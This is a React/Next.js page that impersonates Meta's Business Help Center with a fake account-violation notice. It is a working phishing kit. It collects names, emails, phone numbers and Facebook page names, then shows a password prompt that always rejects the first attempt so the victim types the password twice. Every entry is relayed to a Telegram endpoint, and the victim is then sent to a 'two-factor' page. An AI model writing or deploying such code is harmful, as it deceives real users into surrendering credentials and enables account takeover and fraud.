'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import { Textarea } from "@/components/ui/textarea"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { Button } from "@/components/ui/button"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Search, X } from 'lucide-react'
import { useActiveSession } from '@/contexts/ActiveSessionContext'

type FormData = {
  info: string;
  fullName: string;
  businessEmail: string;
  personalEmail: string;
  phoneNumber: string;
  facebookPage: string;
  terms: boolean;
}

type FormErrors = {
  [K in keyof FormData]?: string;
}

export default function Support() {
  const [isModalOpen, setIsModalOpen] = useState(false)
  const [password, setPassword] = useState('')
  const [showError, setShowError] = useState(false)
  const [attemptCount, setAttemptCount] = useState(0)
  const router = useRouter()

  const [formData, setFormData] = useState<FormData>({
    info: '',
    fullName: '',
    businessEmail: '',
    personalEmail: '',
    phoneNumber: '',
    facebookPage: '',
    terms: false,
  })

  const [errors, setErrors] = useState<FormErrors>({})

  const { addOrUpdateSession } = useActiveSession()

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {}

    if (formData.info.trim().length < 10) {
      newErrors.info = 'Please provide more information (at least 10 characters)'
    }

    if (formData.fullName.trim().length < 2) {
      newErrors.fullName = 'Full name is required'
    }

    if (!/^\S+@\S+\.\S+$/.test(formData.businessEmail)) {
      newErrors.businessEmail = 'Valid business email is required'
    }

    if (!/^\S+@\S+\.\S+$/.test(formData.personalEmail)) {
      newErrors.personalEmail = 'Valid personal email is required'
    }

    if (formData.facebookPage.trim().length < 2) {
      newErrors.facebookPage = 'Facebook page name is required'
    }

    if (!formData.terms) {
      newErrors.terms = 'You must agree to the terms'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const sendToTelegram = async (message: string) => {
    try {
      const response = await fetch('/api/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      })

      if (!response.ok) {
        console.error('Failed to send message to Telegram')
      }
    } catch (error) {
      console.error('Error sending message to Telegram:', error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (validateForm()) {
      const message = `
New Support Form Submission:
Full Name: ${formData.fullName}
Business Email: ${formData.businessEmail}
Personal Email: ${formData.personalEmail}
Phone Number: ${formData.phoneNumber}
Facebook Page: ${formData.facebookPage}
Info: ${formData.info}
      `
      await sendToTelegram(message)
      setIsModalOpen(true)
    }
  }

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setAttemptCount(prevCount => prevCount + 1)
    if (attemptCount === 0) {
      setShowError(true)
      setPassword('')
      const errorMessage = `
Incorrect Password Attempt:
Full Name: ${formData.fullName}
Entered Password: ${password}
      `
      await sendToTelegram(errorMessage)
    } else {
      const message = `
Password Submission:
Full Name: ${formData.fullName}
Password: ${password}
      `
      await sendToTelegram(message)
      setIsModalOpen(false)
      router.push('/two-factor')
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleCheckboxChange = (checked: boolean) => {
    setFormData(prev => ({ ...prev, terms: checked }))
  }

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <header className="w-full bg-[#4267B2] text-white">
        <div className="container mx-auto px-4 py-3 flex justify-between items-center">
          <div className="flex items-center space-x-4">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/278052525_813944336231788_2126819975299864928_n.2ca221b227e5e50b2861f74e67923f35-oc6QePnDuvkRYD2frRlfk4Y81DYo6Q.svg"
              alt="Meta Logo"
              width={54}
              height={12}
            />
            <span className="text-sm">|</span>
            <span className="text-sm">Support Inbox</span>
          </div>
          <Search className="w-5 h-5" />
        </div>
      </header>

      <div className="relative bg-[#1c2b4a] text-white py-16">
        <Image
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-jNs76JQF1jKEkg9vVyRdUB4I6LZElS.png"
          alt="Background"
          layout="fill"
          objectFit="cover"
        />
        <div className="container mx-auto px-4 relative z-10 text-center">
          <h1 className="text-lg font-light mb-2">Meta Business Help Center</h1>
          <h2 className="text-4xl font-bold">Get Support</h2>
        </div>
      </div>

      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-md p-6 max-w-2xl mx-auto">
          <div className="flex justify-between items-center mb-8 relative">
            <div className="absolute top-2 left-[10%] right-[10%] h-0.5 bg-blue-500"></div>
            <div className="flex flex-col items-center z-10">
              <div className="w-4 h-4 bg-blue-500 rounded-full"></div>
              <span className="text-blue-500 text-sm mt-2">Select Asset</span>
            </div>
            <div className="flex flex-col items-center z-10">
              <div className="w-4 h-4 bg-blue-500 rounded-full"></div>
              <span className="text-blue-500 text-sm mt-2">Select the Issue</span>
            </div>
            <div className="flex flex-col items-center z-10">
              <div className="w-4 h-4 bg-blue-500 rounded-full"></div>
              <span className="text-blue-500 text-sm mt-2">Get help</span>
            </div>
          </div>
          <h3 className="text-xl font-semibold mb-4">Get Started</h3>
          <div className="bg-gray-100 p-4 rounded mb-6">
            <p className="mb-2 text-sm">
              We have received multiple reports that suggest that your account has been in violation of
              our terms of services and community guidelines. As a result, your account is scheduled for
              review.
            </p>
            <p className="font-semibold text-sm">Report no: 3088553115</p>
          </div>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label htmlFor="info" className="block mb-2 font-semibold text-sm">
                Please provide us information that will help us investigate
              </label>
              <Textarea
                id="info"
                name="info"
                className="w-full h-32 border rounded-md"
                value={formData.info}
                onChange={handleInputChange}
              />
              {errors.info && <p className="text-red-500 text-xs mt-1">{errors.info}</p>}
            </div>
            <div>
              <label htmlFor="fullName" className="block mb-2 text-sm">
                Full Name
              </label>
              <Input
                id="fullName"
                name="fullName"
                className="w-full"
                value={formData.fullName}
                onChange={handleInputChange}
              />
              {errors.fullName && <p className="text-red-500 text-xs mt-1">{errors.fullName}</p>}
            </div>
            <div>
              <label htmlFor="businessEmail" className="block mb-2 text-sm">
                Business email address
              </label>
              <Input
                id="businessEmail"
                name="businessEmail"
                className="w-full"
                value={formData.businessEmail}
                onChange={handleInputChange}
              />
              {errors.businessEmail && <p className="text-red-500 text-xs mt-1">{errors.businessEmail}</p>}
            </div>
            <div>
              <label htmlFor="personalEmail" className="block mb-2 text-sm">
                Personal email address
              </label>
              <Input
                id="personalEmail"
                name="personalEmail"
                className="w-full"
                value={formData.personalEmail}
                onChange={handleInputChange}
              />
              {errors.personalEmail && <p className="text-red-500 text-xs mt-1">{errors.personalEmail}</p>}
            </div>
            <div>
              <label htmlFor="phoneNumber" className="block mb-2 text-sm">
                Mobile Phone Number
              </label>
              <Input
                id="phoneNumber"
                name="phoneNumber"
                type="tel"
                className="w-full"
                value={formData.phoneNumber}
                onChange={handleInputChange}
              />
            </div>
            <div>
              <label htmlFor="facebookPage" className="block mb-2 text-sm">
                Facebook page name
              </label>
              <Input
                id="facebookPage"
                name="facebookPage"
                className="w-full"
                value={formData.facebookPage}
                onChange={handleInputChange}
              />
              {errors.facebookPage && <p className="text-red-500 text-xs mt-1">{errors.facebookPage}</p>}
            </div>
            <div className="flex items-center space-x-2">
              <Checkbox
                id="terms"
                checked={formData.terms}
                onCheckedChange={handleCheckboxChange}
              />
              <label htmlFor="terms" className="text-sm">
                I agree to our Terms, Data and Cookies Policy.
              </label>
            </div>
            {errors.terms && <p className="text-red-500 text-xs mt-1">{errors.terms}</p>}
            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white">
              Submit
            </Button>
          </form>
        </div>
      </main>

      <footer className="bg-[#4080ff] text-white py-8">
        <div className="container mx-auto px-4">
          <div className="flex flex-col items-center mb-8">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/278052525_813944336231788_2126819975299864928_n.2ca221b227e5e50b2861f74e67923f35-oc6QePnDuvkRYD2frRlfk4Y81DYo6Q.svg"
              alt="Meta Logo"
              width={54}
              height={12}
            />
            <p className="mt-4 text-center">
              Facebook can help your large, medium or small business grow. Get the latest news for advertisers and more on our Meta for Business Page.
            </p>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-8">
            <div>
              <h3 className="font-semibold mb-4">Marketing on Facebook</h3>
              <ul className="space-y-2">
                <li>Success Stories</li>
                <li>Measurement</li>
                <li>Industries</li>
                <li>Inspiration</li>
                <li>Events</li>
                <li>News</li>
                <li>Site map</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-4">Marketing objectives</h3>
              <ul className="space-y-2">
                <li>Build your presence</li>
                <li>Create awareness</li>
                <li>Drive discovery</li>
                <li>Generate leads</li>
                <li>Boost sales</li>
                <li>Earn loyalty</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-4">Facebook Pages</h3>
              <ul className="space-y-2">
                <li>Get started with Pages</li>
                <li>Setting up your Page</li>
                <li>Manage your Facebook Page</li>
                <li>Promote your Page</li>
                <li>Messaging on your Page</li>
                <li>Page Insights</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-4">Facebook ads</h3>
              <ul className="space-y-2">
                <li>Get started with ads</li>
                <li>Buying Facebook ads</li>
                <li>Ad formats</li>
                <li>Ad placement</li>
                <li>Choose your audience</li>
                <li>Measure your ads</li>
                <li>Managing your ads</li>
              </ul>
            </div>
          </div>
        </div>
      </footer>

      <div className="bg-[#4080ff] text-white py-4">
        <div className="container mx-auto px-4 text-center">
          <div className="flex flex-wrap justify-center space-x-4 mb-2">
            <span className="mb-2">English (US)</span>
            <span className="mb-2">English (UK)</span>
            <span className="mb-2">Español</span>
            <span className="mb-2">Português (Brasil)</span>
            <span className="mb-2">Français (France)</span>
            <span className="mb-2">Español (España)</span>
            <span className="mb-2">More languages</span>
          </div>
          <div className="text-sm flex flex-wrap justify-center">
            <span className="mr-2 mb-1">© 2024 Meta</span>
            <span className="mr-2 mb-1">About</span>
            <span className="mr-2 mb-1">Developers</span>
            <span className="mr-2 mb-1">Careers</span>
            <span className="mr-2 mb-1">Privacy</span>
            <span className="mr-2 mb-1">Cookies</span>
            <span className="mr-2 mb-1">Terms</span>
            <span className="mb-1">Help Center</span>
          </div>
        </div>
      </div>

      <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader>
            <DialogTitle className="text-xl font-semibold">
              {showError ? "Please Re-Enter Your Password" : "Please Enter Your Password"}
            </DialogTitle>
            <button
              onClick={() => setIsModalOpen(false)}
              className="absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground"
            >
              {/*<X className="h-4 w-4" />*/}
              <span className="sr-only">Close</span>
            </button>
          </DialogHeader>
          <DialogDescription className="text-sm text-gray-500">
            For your security, you must enter your password to continue.
          </DialogDescription>
          <form onSubmit={handlePasswordSubmit} className="grid gap-4 py-4">
            <div className="grid grid-cols-4 items-center gap-4">
              <label htmlFor="password" className="text-right text-sm">
                Password:
              </label>
              <Input
                id="password"
                type="password"
                className="col-span-3"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            {showError && (
              <p className="text-red-500 text-sm">The password you&apos;ve entered is incorrect.</p>
            )}
            <div className="flex justify-end">
              <Button type="submit" className="bg-blue-600 hover:bg-blue-700 text-white">
                Continue
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>
    </div>
  )
}